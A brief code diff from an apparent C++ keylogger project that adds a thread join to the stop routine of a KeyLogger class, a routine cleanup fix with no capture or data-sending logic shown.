@@ -138,6 +138,7 @@ void KeyLogger::startKeylogger() {
 void KeyLogger::stopKeylogger() {
     stop = true;
     fout.close();
+	logThread.join();
 }
 
 std::ifstream KeyLogger::getLoggingStream() {
